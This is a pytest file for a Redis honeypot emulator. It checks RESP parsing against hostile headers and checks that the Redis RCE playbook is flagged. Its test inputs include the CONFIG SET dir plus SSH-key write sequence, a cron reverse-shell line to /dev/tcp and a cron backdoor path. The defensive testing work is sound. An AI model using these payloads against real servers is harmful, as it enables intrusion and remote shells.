"""Unit tests for the Redis emulator.

Two things are being pinned here. First, the RESP parser: it reads
attacker-controlled length prefixes, so every bound (array count, bulk length,
negative and non-numeric values) needs a test that proves a hostile header is
refused rather than allocated. Second, the classification of the Redis RCE
playbook — ``CONFIG SET dir`` + ``SET`` an SSH key + ``SAVE`` — which is the
sequence the whole emulator exists to capture. If those stop being CRITICAL the
sensor still records traffic but stops raising the thing worth waking up for.
"""

from __future__ import annotations

from honeypot.services.redis_service import DANGEROUS, RedisService
from storage.models import EventType, Severity


def resp(*args: str) -> bytes:
    """Encode a RESP array the way a real client would frame it."""
    out = f"*{len(args)}\r\n"
    for arg in args:
        out += f"${len(arg)}\r\n{arg}\r\n"
    return out.encode()


def inline(*lines: str) -> bytes:
    return "".join(f"{line}\r\n" for line in lines).encode()


def command_events(logger) -> list[dict]:
    return logger.of_type(EventType.COMMAND)


# --------------------------------------------------------------------------- #
# Framing
# --------------------------------------------------------------------------- #


class TestRespParsing:
    def test_resp_array_is_parsed(self, protocol_harness):
        _, logger, _ = protocol_harness(RedisService, resp("SET", "key", "value"))
        assert command_events(logger)[0]["command"] == "SET key value"

    def test_inline_command_is_parsed(self, protocol_harness):
        writer, _, _ = protocol_harness(RedisService, inline("PING"))
        assert writer.text == "+PONG\r\n"

    def test_multiple_commands_in_one_stream(self, protocol_harness):
        _, logger, _ = protocol_harness(RedisService, resp("PING") + resp("DBSIZE"))
        assert len(command_events(logger)) == 2

    def test_binary_safe_bulk_values_survive(self, protocol_harness):
        # A value containing spaces must not be re-split into extra arguments.
        _, logger, _ = protocol_harness(RedisService, resp("SET", "k", "a b c"))
        assert command_events(logger)[0]["command"] == "SET k a b c"

    def test_blank_line_is_skipped_not_treated_as_a_command(self, protocol_harness):
        _, logger, _ = protocol_harness(RedisService, b"\r\n" + resp("PING"))
        assert len(command_events(logger)) == 1


class TestHostileFraming:
    def test_array_count_above_the_cap_is_refused(self, protocol_harness):
        # 1025 > MAX_ARRAY_LEN: must be dropped, never pre-allocated.
        _, logger, _ = protocol_harness(RedisService, b"*1025\r\n" + resp("PING"))
        assert not any(e["command"].startswith("*") for e in command_events(logger))

    def test_bulk_length_above_the_cap_stops_parsing(self, protocol_harness):
        # 100 KB > MAX_BULK_LEN (64 KB).
        script = b"*2\r\n$3\r\nSET\r\n$102400\r\n" + b"A" * 100 + b"\r\n"
        _, logger, _ = protocol_harness(RedisService, script)
        recorded = command_events(logger)
        assert recorded == [] or "A" * 100 not in recorded[0]["command"]

    def test_negative_bulk_length_is_refused(self, protocol_harness):
        _, logger, _ = protocol_harness(RedisService, b"*2\r\n$3\r\nGET\r\n$-5\r\nx\r\n")
        assert all("-5" not in e["command"] for e in command_events(logger))

    def test_non_numeric_array_count_does_not_raise(self, protocol_harness):
        writer, _, _ = protocol_harness(RedisService, b"*abc\r\n" + resp("PING"))
        assert "+PONG" in writer.text  # recovered and kept serving

    def test_non_numeric_bulk_length_does_not_raise(self, protocol_harness):
        protocol_harness(RedisService, b"*2\r\n$3\r\nGET\r\n$xyz\r\nk\r\n")  # must not raise

    def test_missing_bulk_header_returns_what_was_read(self, protocol_harness):
        # Second element is not a '$' header: parsing stops, no exception.
        protocol_harness(RedisService, b"*2\r\n$3\r\nGET\r\nnot-a-header\r\n")

    def test_truncated_array_at_eof_does_not_raise(self, protocol_harness):
        protocol_harness(RedisService, b"*3\r\n$3\r\nSET\r\n")

    def test_zero_length_array_is_ignored(self, protocol_harness):
        _, logger, _ = protocol_harness(RedisService, b"*0\r\n" + resp("PING"))
        assert len(command_events(logger)) == 1


# --------------------------------------------------------------------------- #
# The RCE playbook
# --------------------------------------------------------------------------- #


class TestDangerousCommands:
    def test_config_is_critical(self, protocol_harness):
        _, logger, _ = protocol_harness(RedisService, resp("CONFIG", "SET", "dir", "/root/.ssh"))
        event = command_events(logger)[0]
        assert event["severity"] == Severity.CRITICAL.value
        assert "redis-config-abuse" in event["tags"]
        assert "redis-dangerous" in event["tags"]

    def test_module_load_is_critical(self, protocol_harness):
        writer, logger, _ = protocol_harness(RedisService, resp("MODULE", "LOAD", "/tmp/exp.so"))
        assert command_events(logger)[0]["severity"] == Severity.CRITICAL.value
        assert "redis-module-load" in logger.tags()
        # A real server without the module answers with an error; so do we.
        assert writer.text.startswith("-ERR")

    def test_replication_hijack_is_critical(self, protocol_harness):
        for verb in ("SLAVEOF", "REPLICAOF"):
            _, logger, _ = protocol_harness(RedisService, resp(verb, "198.51.100.9", "6379"))
            assert command_events(logger)[0]["severity"] == Severity.CRITICAL.value
            assert "redis-replication-hijack" in logger.tags()

    def test_lua_eval_is_flagged(self, protocol_harness):
        for verb in ("EVAL", "EVALSHA"):
            _, logger, _ = protocol_harness(RedisService, resp(verb, "return 1", "0"))
            tags = command_events(logger)[0]["tags"]
            assert "redis-lua-eval" in tags, verb
            assert "redis-dangerous" in tags, verb

    def test_persistence_verbs_are_high(self, protocol_harness):
        for verb in ("SAVE", "BGSAVE"):
            _, logger, _ = protocol_harness(RedisService, resp(verb))
            assert command_events(logger)[0]["severity"] == Severity.HIGH.value, verb
            assert "redis-persist" in logger.tags(), verb

    def test_every_dangerous_verb_carries_the_shared_tag(self, protocol_harness):
        # The detection rule matches on 'redis-dangerous', so no entry in the
        # table may be tagged without it.
        for verb in DANGEROUS:
            _, logger, _ = protocol_harness(RedisService, resp(verb.upper(), "x"))
            assert "redis-dangerous" in command_events(logger)[0]["tags"], verb

    def test_ordinary_command_is_low_and_untagged(self, protocol_harness):
        _, logger, _ = protocol_harness(RedisService, resp("GET", "somekey"))
        event = command_events(logger)[0]
        assert event["severity"] == Severity.LOW.value
        assert event["tags"] == ["redis-command"]


class TestRcePayloadDetection:
    def test_ssh_rsa_key_write_is_critical(self, protocol_harness):
        key = "\n\nssh-rsa AAAAB3NzaC1yc2EAAAA attacker@host\n\n"
        _, logger, _ = protocol_harness(RedisService, resp("SET", "crackit", key))
        event = command_events(logger)[0]
        assert event["severity"] == Severity.CRITICAL.value
        assert "redis-rce-payload" in event["tags"]

    def test_ed25519_key_write_is_critical(self, protocol_harness):
        _, logger, _ = protocol_harness(
            RedisService, resp("SET", "k", "ssh-ed25519 AAAAC3Nza attacker@host")
        )
        assert "redis-rce-payload" in logger.tags()

    def test_cron_line_write_is_critical(self, protocol_harness):
        payload = "\n* * * * * bash -i >& /dev/tcp/198.51.100.9/4444 0>&1\n"
        _, logger, _ = protocol_harness(RedisService, resp("SET", "cron", payload))
        assert command_events(logger)[0]["severity"] == Severity.CRITICAL.value
        assert "redis-rce-payload" in logger.tags()

    def test_cron_path_write_is_critical(self, protocol_harness):
        _, logger, _ = protocol_harness(RedisService, resp("SET", "k", "/etc/cron.d/backdoor"))
        assert "redis-rce-payload" in logger.tags()

    def test_harmless_set_is_not_flagged_as_a_payload(self, protocol_harness):
        _, logger, _ = protocol_harness(RedisService, resp("SET", "session:42", "abc123"))
        assert "redis-rce-payload" not in logger.tags()
        assert command_events(logger)[0]["severity"] == Severity.LOW.value

    def test_the_full_playbook_is_captured_end_to_end(self, protocol_harness):
        script = (
            resp("CONFIG", "SET", "dir", "/root/.ssh")
            + resp("CONFIG", "SET", "dbfilename", "authorized_keys")
            + resp("SET", "crackit", "\n\nssh-rsa AAAAB3NzaC1 attacker@host\n\n")
            + resp("SAVE")
        )
        _, logger, _ = protocol_harness(RedisService, script)
        tags = logger.tags()
        assert {"redis-config-abuse", "redis-rce-payload", "redis-persist"} <= tags
        criticals = [e for e in command_events(logger) if e["severity"] == Severity.CRITICAL.value]
        assert len(criticals) == 3  # two CONFIGs and the key write


# --------------------------------------------------------------------------- #
# AUTH and replies
# --------------------------------------------------------------------------- #


class TestAuth:
    def test_single_argument_auth_captures_the_password(self, protocol_harness):
        _, logger, _ = protocol_harness(RedisService, resp("AUTH", "s3cret"))
        event = logger.of_type(EventType.AUTH_ATTEMPT)[0]
        assert event["password"] == "s3cret"
        assert event["username"] is None

    def test_two_argument_auth_captures_both(self, protocol_harness):
        _, logger, _ = protocol_harness(RedisService, resp("AUTH", "admin", "s3cret"))
        event = logger.of_type(EventType.AUTH_ATTEMPT)[0]
        assert event["username"] == "admin"
        assert event["password"] == "s3cret"

    def test_auth_always_succeeds_so_the_session_continues(self, protocol_harness):
        # Rejecting would end the interesting part of the conversation.
        writer, _, _ = protocol_harness(RedisService, resp("AUTH", "x") + resp("PING"))
        assert writer.text == "+OK\r\n+PONG\r\n"

    def test_auth_is_not_recorded_as_a_command(self, protocol_harness):
        _, logger, _ = protocol_harness(RedisService, resp("AUTH", "x"))
        assert command_events(logger) == []


class TestReplies:
    def test_info_advertises_a_plausible_server(self, protocol_harness):
        writer, _, _ = protocol_harness(RedisService, resp("INFO"))
        assert "redis_version:" in writer.text
        assert writer.text.startswith("$")

    def test_info_bulk_length_matches_its_payload(self, protocol_harness):
        # A wrong length prefix makes a real client hang waiting for bytes.
        writer, _, _ = protocol_harness(RedisService, resp("INFO"))
        header, _, rest = writer.text.partition("\r\n")
        assert len(rest[: -len("\r\n")].encode()) == int(header[1:])

    def test_get_returns_nil(self, protocol_harness):
        writer, _, _ = protocol_harness(RedisService, resp("GET", "k"))
        assert writer.text == "$-1\r\n"

    def test_dbsize_returns_an_integer_reply(self, protocol_harness):
        writer, _, _ = protocol_harness(RedisService, resp("DBSIZE"))
        assert writer.text == ":0\r\n"

    def test_command_returns_an_empty_array(self, protocol_harness):
        writer, _, _ = protocol_harness(RedisService, resp("COMMAND"))
        assert writer.text == "*0\r\n"

    def test_quit_replies_then_stops_processing(self, protocol_harness):
        writer, logger, _ = protocol_harness(RedisService, resp("QUIT") + resp("PING"))
        assert writer.text == "+OK\r\n"
        assert len(command_events(logger)) == 1

    def test_unknown_verb_still_answers_ok(self, protocol_harness):
        # Silence is a fingerprint; a real server answers something.
        writer, _, _ = protocol_harness(RedisService, resp("FROBNICATE"))
        assert writer.text == "+OK\r\n"


# --------------------------------------------------------------------------- #
# Storage budgets
# --------------------------------------------------------------------------- #


class TestStorageBudgets:
    def test_huge_argument_is_truncated_before_recording(self, protocol_harness):
        _, logger, _ = protocol_harness(RedisService, resp("SET", "k", "A" * 5000))
        recorded = command_events(logger)[0]["command"]
        assert len(recorded) <= 2048
        assert "A" * 257 not in recorded  # each argument capped at 256

    def test_many_arguments_are_capped_overall(self, protocol_harness):
        _, logger, _ = protocol_harness(RedisService, resp("MSET", *[f"k{i}" for i in range(400)]))
        assert len(command_events(logger)[0]["command"]) <= 2048

    def test_command_loop_is_bounded(self, protocol_harness):
        # 250 commands offered, at most 200 served: a client cannot hold the
        # loop open indefinitely.
        _, logger, _ = protocol_harness(RedisService, resp("PING") * 250)
        assert len(command_events(logger)) <= 200

    def test_event_budget_ends_the_session(self, protocol_harness):
        _, logger, _ = protocol_harness(RedisService, resp("PING") * 50, max_events_per_session=10)
        assert len(logger.events) == 10
